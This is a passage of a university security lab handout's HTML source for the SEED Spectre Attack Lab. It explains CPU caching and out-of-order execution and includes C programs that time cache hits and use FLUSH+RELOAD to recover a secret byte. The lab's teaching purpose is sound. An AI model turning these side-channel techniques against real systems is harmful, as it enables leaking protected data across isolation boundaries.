@@ -1,0 +1,1050 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <title>Spectre Attack Lab &mdash; Network Security Lab  documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+
+  
+  
+
+  
+  
+
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Mobile Security Labs" href="../mobile/mobile_index.html" />
+    <link rel="prev" title="Meltdown Attack Lab" href="meltdown_attack.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html" class="icon icon-home"> Network Security Lab
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="hardware_index.html">Hardware Labs</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="meltdown_attack.html">Meltdown Attack Lab</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Spectre Attack Lab</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#introduction">Introduction</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#code-compilation">Code Compilation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#tasks-1-and-2-side-channel-attacks-via-cpu-caches">Tasks 1 and 2: Side Channel Attacks via CPU Caches</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-3-out-of-order-execution-and-branch-prediction">Task 3: Out-of-Order Execution and Branch Prediction</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-4-the-spectre-attack">Task 4: The Spectre Attack</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-5-improve-the-attack-accuracy">Task 5: Improve the Attack Accuracy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-6-steal-the-entire-secret-string">Task 6: Steal the Entire Secret String</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../software/software_index.html">Software Security Labs</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Network Security Lab</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
+        
+          <li><a href="hardware_index.html">Hardware Labs</a> &raquo;</li>
+        
+      <li>Spectre Attack Lab</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="center docutils container">
+<p>Spectre Attack Lab</p>
+</div>
+<div class="section" id="spectre-attack-lab">
+<h1>Spectre Attack Lab<a class="headerlink" href="#spectre-attack-lab" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="introduction">
+<h2>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h2>
+<p>Discovered in 2017 and publicly disclosed in January 2018, the Spectre
+attack exploits critical vulnerabilities existing in many modern
+processors, including those from Intel, AMD, and
+ARM <a class="reference internal" href="#id1">|1|</a>. The vulnerabilities allow a
+program to break inter-process and intra-process isolation, so a
+malicious program can read the data from the area that is not accessible
+to it. Such an access is not allowed by the hardware protection
+mechanism (for inter-process isolation) or software protection mechanism
+(for intra-process isolation), but a vulnerability exists in the design
+of CPUs that makes it possible to defeat the protections. Because the
+flaw exists in the hardware, it is very difficult to fundamentally fix
+the problem, unless we change the CPUs in our computers. The Spectre
+vulnerability represents a special genre of vulnerabilities in the
+design of CPUs. Along with the Meltdown vulnerability, they provide an
+invaluable lesson for security education.</p>
+<p><em>The learning objective</em> of this lab is for students to gain first-hand
+experiences on the Spectre attack. The attack itself is quite
+sophisticated, so we break it down into several small steps, each of
+which is easy to understand and perform. Once students understand each
+step, it should not be difficult for them to put everything together to
+perform the actual attack. This lab covers a number of topics described
+in the following:</p>
+<ul class="simple">
+<li><p>Spectre attack</p></li>
+<li><p>Side channel attack</p></li>
+<li><p>CPU caching</p></li>
+<li><p>Out-of-order execution and branch prediction inside CPU
+microarchitecture</p></li>
+</ul>
+<div class="section" id="readings-and-videos">
+<h3>Readings and videos.<a class="headerlink" href="#readings-and-videos" title="Permalink to this headline">¶</a></h3>
+<p>Detailed coverage of the Spectre attack can be found in the following:</p>
+<ul class="simple">
+<li><p>Chapter 14 of the SEED Book, <em>Computer &amp; Internet Security: A
+Hands-on Approach</em>, 2nd Edition, by Wenliang Du. See details at
+<a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
+<li><p>Section 8 of the SEED Lecture, <em>Computer Security: A Hands-on
+Approach</em>, by Wenliang Du. See details at
+<a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
+</ul>
+</div>
+<div class="section" id="downloadable-files">
+<h3>Downloadable Files.<a class="headerlink" href="#downloadable-files" title="Permalink to this headline">¶</a></h3>
+<p>Please download the following package containing all classes used in this lab <a class="reference download internal" download="" href="../../_downloads/2ed01756c3a492e78892334976456f75/Files.zip"><code class="xref download docutils literal notranslate"><span class="pre">Here</span></code></a>.</p>
+</div>
+<div class="section" id="lab-environment">
+<h3>Lab Environment.<a class="headerlink" href="#lab-environment" title="Permalink to this headline">¶</a></h3>
+<p>This lab has been tested on our pre-built Ubuntu 16.04 and 20.04 VMs,
+which can be downloaded from the SEED website.</p>
+<p>When using this lab, instructors should keep the followings in mind:
+First, although the Spectre vulnerability is a common design flaw inside
+Intel, AMD, and ARM CPUs, we have only tested the lab activities on
+Intel CPUs. Second, Intel is working on fixing this problem in its CPUs,
+so if a student’s computer uses new Intel CPUs, the attack may not work.
+As of May 2021, it is not a problem for most students, but as time goes
+on, problems may arise.</p>
+</div>
+<div class="section" id="acknowledgment">
+<h3>Acknowledgment<a class="headerlink" href="#acknowledgment" title="Permalink to this headline">¶</a></h3>
+<p>This lab was developed with the help of Kuber Kohli and Hao Zhang,
+graduate students in the Department of Electrical Engineering and
+Computer Science at Syracuse University.</p>
+</div>
+</div>
+<div class="section" id="code-compilation">
+<h2>Code Compilation<a class="headerlink" href="#code-compilation" title="Permalink to this headline">¶</a></h2>
+<p>For most of our tasks, you need to add <code class="docutils literal notranslate"><span class="pre">-march=native</span></code> flag when
+compiling the code with <code class="docutils literal notranslate"><span class="pre">gcc</span></code>. The <code class="docutils literal notranslate"><span class="pre">march</span></code> flag tells the compiler
+to enable all instruction subsets supported by the local machine. For
+example, we compile <code class="docutils literal notranslate"><span class="pre">myprog.c</span></code> using the following command:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ gcc -march=native -o myprog myprog.c
+</pre></div>
+</div>
+</div>
+<div class="section" id="tasks-1-and-2-side-channel-attacks-via-cpu-caches">
+<h2>Tasks 1 and 2: Side Channel Attacks via CPU Caches<a class="headerlink" href="#tasks-1-and-2-side-channel-attacks-via-cpu-caches" title="Permalink to this headline">¶</a></h2>
+<p>Both the Meltdown and Spectre attacks use CPU cache as a side channel to
+steal a protected secret. The technique used in this side-channel attack
+is called FLUSH+RELOAD <a class="reference internal" href="#id2">|2|</a>. We will study this
+technique first. The code developed in these two tasks will be used as a
+building block in later tasks.</p>
+<p>A CPU cache is a hardware cache used by the CPU of a computer to reduce
+the average cost (time or energy) to access data from the main memory.
+Accessing data from CPU cache is much faster than accessing from the
+main memory. When data are fetched from the main memory, they are
+usually cached by the CPU, so if the same data are used again, the
+access time will be much faster. Therefore, when a CPU needs to access
+some data, it first looks at its caches. If the data is there (this is
+called cache hit), it will be fetched directly from there. If the data
+is not there (this is called miss), the CPU will go to the main memory
+to get the data. The time spent in the latter case is significant
+longer. Most modern CPUs have CPU caches.</p>
+<div class="align-center figure align-default" id="id3">
+<img alt="Cache hit and miss" src="../../_images/cachehitmiss.jpg" />
+<p class="caption"><span class="caption-text">Figure 1: Cache hit and miss</span><a class="headerlink" href="#id3" title="Permalink to this image">¶</a></p>
+</div>
+<div class="section" id="task-1-reading-from-cache-versus-from-memory">
+<h3>Task 1: Reading from Cache versus from Memory<a class="headerlink" href="#task-1-reading-from-cache-versus-from-memory" title="Permalink to this headline">¶</a></h3>
+<p>The cache memory is used to provide data to the high speed processors at
+a faster speed. The cache memories are very fast compared to the main
+memory. Let us see the time difference. In the following code
+(<code class="docutils literal notranslate"><span class="pre">CacheTime.c</span></code>), we have an array of size <code class="docutils literal notranslate"><span class="pre">10*4096</span></code>. We first access
+two of its elements, <code class="docutils literal notranslate"><span class="pre">array[3*4096]</span></code> and <code class="docutils literal notranslate"><span class="pre">array[7*4096]</span></code>. Therefore,
+the pages containing these two elements will be cached. We then read the
+elements from <code class="docutils literal notranslate"><span class="pre">array[0*4096]</span></code> to <code class="docutils literal notranslate"><span class="pre">array[9*4096]</span></code> and measure the
+time spent in the memory reading.
+<strong>Figure 1</strong> illustrates the difference.
+In the code, Line ① reads the CPU’s timestamp (TSC) counter before the
+memory read, while Line ② reads the counter after the memory read. Their
+difference is the time (in terms of number of CPU cycles) spent in the
+memory read. It should be noted that caching is done at the cache block
+level, not at the byte level. A typical cache block size is 64 bytes. We
+use <code class="docutils literal notranslate"><span class="pre">array[k*4096]</span></code>, so no two elements used in the program fall into
+the same cache block.</p>
+<div class="literal-block-wrapper docutils container" id="id4">
+<div class="code-block-caption"><span class="caption-text">Listing 1: CacheTime.c</span><a class="headerlink" href="#id4" title="Permalink to this code">¶</a></div>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
+
+<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">10</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">junk</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
+  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="c1">// Initialize the array</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+  <span class="c1">// FLUSH the array from the CPU cache</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span><span class="p">]);</span>
+  <span class="c1">// Access some of the array items</span>
+  <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="o">*</span><span class="mi">4096</span><span class="p">]</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+  <span class="n">array</span><span class="p">[</span><span class="mi">7</span><span class="o">*</span><span class="mi">4096</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
+    <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>   <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+    <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>  
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Access time for array[%d*4096]: %d CPU cycles</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">time2</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> 
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<p>Please compile the following code using
+<code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-march=native</span> <span class="pre">CacheTime.c</span></code>, and run it. Is the access of
+<code class="docutils literal notranslate"><span class="pre">array[3*4096]</span></code> and <code class="docutils literal notranslate"><span class="pre">array[7*4096]</span></code> faster than that of the other
+elements? You should run the program at least 10 times and describe your
+observations. From the experiment, you need to find a threshold that can
+be used to distinguish these two types of memory access: accessing data
+from the cache versus accessing data from the main memory. This
+threshold is important for the rest of the tasks in this lab.</p>
+</div>
+<div class="section" id="task-2-using-cache-as-a-side-channel">
+<h3>Task 2: Using Cache as a Side Channel<a class="headerlink" href="#task-2-using-cache-as-a-side-channel" title="Permalink to this headline">¶</a></h3>
+<div class="align-center figure align-default" id="id5">
+<img alt="Diagram depicting the Side Channel Attack" src="../../_images/flushreload.jpg" />
+<p class="caption"><span class="caption-text">Figure 2: Diagram depicting the Side Channel Attack</span><a class="headerlink" href="#id5" title="Permalink to this image">¶</a></p>
+</div>
+<p>The objective of this task is to use the side channel to extract a
+secret value used by the victim function. Assume there is a victim
+function that uses a secret value as index to load some values from an
+array. Also assume that the secret value cannot be accessed from the
+outside. Our goal is to use side channels to get this secret value. The
+technique that we will be using is called
+FLUSH+RELOAD <a class="reference internal" href="#id2">|2|</a>. <strong>Figure 2</strong> illustrates the technique, which consists of three steps:</p>
+<ol class="arabic simple">
+<li><p>FLUSH the entire array from the cache memory to make sure the array
+is not cached.</p></li>
+<li><p>Invoke the victim function, which accesses one of the array elements
+based on the value of the secret. This action causes the
+corresponding array element to be cached.</p></li>
+<li><p>RELOAD the entire array, and measure the time it takes to reload each
+element. If one specific element’s loading time is fast, it is very
+likely that element is already in the cache. This element must be the
+one accessed by the victim function. Therefore, we can figure out
+what the secret value is.</p></li>
+</ol>
+<p>The following program uses the FLUSH+RELOAD technique to find out a
+one-byte secret value contained in the variable <code class="docutils literal notranslate"><span class="pre">secret</span></code>. Since there
+are 256 possible values for a one-byte secret, we need to map each value
+to an array element. The naive way is to define an array of 256 elements
+(i.e., <code class="docutils literal notranslate"><span class="pre">array[256]</span></code>). However, this does not work. Caching is done at
+a block level, not at a byte level. If <code class="docutils literal notranslate"><span class="pre">array[k]</span></code> is accessed, a block
+of memory containing this element will be cached. Therefore, the
+adjacent elements of <code class="docutils literal notranslate"><span class="pre">array[k]</span></code> will also be cached, making it
+difficult to infer what the secret is. To solve this problem, we create
+an array of <code class="docutils literal notranslate"><span class="pre">256*4096</span></code> bytes. Each element used in our RELOAD step is
+<code class="docutils literal notranslate"><span class="pre">array[k*4096]</span></code>. Because <code class="docutils literal notranslate"><span class="pre">4096</span></code> is larger than a typical cache block
+size (64 bytes), no two different elements <code class="docutils literal notranslate"><span class="pre">array[i*4096]</span></code> and
+<code class="docutils literal notranslate"><span class="pre">array[j*4096]</span></code> will be in the same cache block.</p>
+<p>Since <code class="docutils literal notranslate"><span class="pre">array[0*4096]</span></code> may fall into the same cache block as the
+variables in the adjacent memory, it may be accidentally cached due to
+the caching of those variables. Therefore, we should avoid using
+<code class="docutils literal notranslate"><span class="pre">array[0*4096]</span></code> in the FLUSH+RELOAD method (for other index <code class="docutils literal notranslate"><span class="pre">k</span></code>,
+<code class="docutils literal notranslate"><span class="pre">array[k*4096]</span></code> does not have a problem). To make it consistent in the
+program, we use <code class="docutils literal notranslate"><span class="pre">array[k*4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code> for all <code class="docutils literal notranslate"><span class="pre">k</span></code> values, where
+<code class="docutils literal notranslate"><span class="pre">DELTA</span></code> is defined as a constant <code class="docutils literal notranslate"><span class="pre">1024</span></code>.</p>
+<div class="literal-block-wrapper docutils container" id="id6">
+<div class="code-block-caption"><span class="caption-text">Listing 2: FlushReload.c</span><a class="headerlink" href="#id6" title="Permalink to this code">¶</a></div>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
+
+<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">temp</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">94</span><span class="p">;</span>
+<span class="cm">/* cache hit time threshold assumed*/</span>
+<span class="cp">#define CACHE_HIT_THRESHOLD (80)</span>
+<span class="cp">#define DELTA 1024</span>
+
+<span class="kt">void</span> <span class="nf">victim</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">temp</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">secret</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">flushSideChannel</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="c1">// Write to array to bring it to RAM to prevent Copy-on-write</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="c1">//flush the values of the array from cache</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span><span class="n">DELTA</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">reloadSideChannel</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">junk</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
+  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+   <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
+   <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
+   <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+   <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
+   <span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">){</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;array[%d*4096 + %d] is in cache.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">DELTA</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The Secret = %d.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
+   <span class="p">}</span>
+  <span class="p">}</span> 
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">flushSideChannel</span><span class="p">();</span>
+  <span class="n">victim</span><span class="p">();</span>
+  <span class="n">reloadSideChannel</span><span class="p">();</span>
+  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<p>Please compile the program using <code class="docutils literal notranslate"><span class="pre">gcc</span></code> and run it (see
+Section 2 for compilation
+instruction). It should be noted that the technique is not 100 percent
+accurate, and you may not be able to observe the expected output all the
+time. Run the program for at least 20 times, and count how many times
+you will get the secret correctly. You can also adjust the threshold
+<code class="docutils literal notranslate"><span class="pre">CACHE_HIT_THRESHOLD</span></code> to the one derived from Task 1 (80 is used in
+this code).</p>
+</div>
+</div>
+<div class="section" id="task-3-out-of-order-execution-and-branch-prediction">
+<h2>Task 3: Out-of-Order Execution and Branch Prediction<a class="headerlink" href="#task-3-out-of-order-execution-and-branch-prediction" title="Permalink to this headline">¶</a></h2>
+<p>The objective of this task is to understand the out-of-order execution
+in CPUs. We will use an experiment to help students observe such kind of
+execution.</p>
+<div class="section" id="out-of-order-execution">
+<h3>Out-Of-Order Execution<a class="headerlink" href="#out-of-order-execution" title="Permalink to this headline">¶</a></h3>
+<p>The Spectre attack relies on an important feature implemented in most
+CPUs. To understand this feature, let us see the following code. This
+code checks whether <code class="docutils literal notranslate"><span class="pre">x</span></code> is less than <code class="docutils literal notranslate"><span class="pre">size</span></code>, if so, the variable
+<code class="docutils literal notranslate"><span class="pre">data</span></code> will be updated. Assume that the value of <code class="docutils literal notranslate"><span class="pre">size</span></code> is 10, so if
+<code class="docutils literal notranslate"><span class="pre">x</span></code> equals <code class="docutils literal notranslate"><span class="pre">15</span></code>, the code in Line 3 will not be executed.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>1  data = 0;
+2  if (x &lt; size) {
+3     data = data + 5;
+4  }
+</pre></div>
+</div>
+<p>The above statement about the code example is true when looking from
+outside of the CPU. However, it is not completely true if we get into
+the CPU, and look at the execution sequence at the microarchitectural
+level. If we do that, we will find out that Line 3 may be successfully
+executed even though the value of <code class="docutils literal notranslate"><span class="pre">x</span></code> is larger than <code class="docutils literal notranslate"><span class="pre">size</span></code>. This is
+due to an important optimization technique adopted by modern CPUs. It is
+called out-of-order execution.</p>
+<p>Out-of-order execution is an optimization technique that allows CPU to
+maximize the utilization of all its execution units. Instead of
+processing instructions strictly in a sequential order, a CPU executes
+them in parallel as soon as all required resources are available. While
+the execution unit of the current operation is occupied, other execution
+units can run ahead.</p>
+<p>In the code example above, at the microarchitectural level, Line 2
+involves two operations: load the value of <code class="docutils literal notranslate"><span class="pre">size</span></code> from the memory, and
+compare the value with <code class="docutils literal notranslate"><span class="pre">x</span></code>. If <code class="docutils literal notranslate"><span class="pre">size</span></code> is not in the CPU caches, it
+may take hundreds of CPU clock cycles before that value is read. Instead
+of sitting idle, modern CPUs try to predict the outcome of the
+comparison, and speculatively execute the branches based on the
+estimation. Since such execution starts before the comparison even
+finishes, the execution is called out-of-order execution. Before doing
+the out-of-order execution, the CPU stores its current state and value
+of registers. When the value of <code class="docutils literal notranslate"><span class="pre">size</span></code> finally arrives, the CPU will
+check the actual outcome. If the prediction is true, the speculatively
+performed execution is committed and there is a significant performance
+gain. If the prediction is wrong, the CPU will revert back to its saved
+state, so all the results produced by the out-of-order execution will be
+discarded like it has never happened. That is why from outside we see
+that Line 3 was never executed. <strong>Figure 3</strong>
+illustrates the out-of-order execution caused by Line 2 of the sample
+code.</p>
+<div class="align-center figure align-default" id="id7">
+<img alt="Speculative execution (out-of-order execution)" src="../../_images/spectre.jpg" />
+<p class="caption"><span class="caption-text">Figure 3: Speculative execution (out-of-order execution)</span><a class="headerlink" href="#id7" title="Permalink to this image">¶</a></p>
+</div>
+<p>Intel and several CPU makers made a severe mistake in the design of the
+out-of-order execution. They wipe out the effects of the out-of-order
+execution on registers and memory if such an execution is not supposed
+to happen, so the execution does not lead to any visible effect.
+However, they forgot one thing, the effect on CPU caches. During the
+out-of-order execution, the referenced memory is fetched into a register
+and is also stored in the cache. If the results of the out-of-order
+execution have to be discarded, the caching caused by the execution
+should also be discarded. Unfortunately, this is not the case in most
+CPUs. Therefore, it creates an observable effect. Using the side-channel
+technique described in Tasks 1 and 2, we can observe such an effect. The
+Spectre attack cleverly uses this observable effect to find out
+protected secret values.</p>
+</div>
+<div class="section" id="the-experiment">
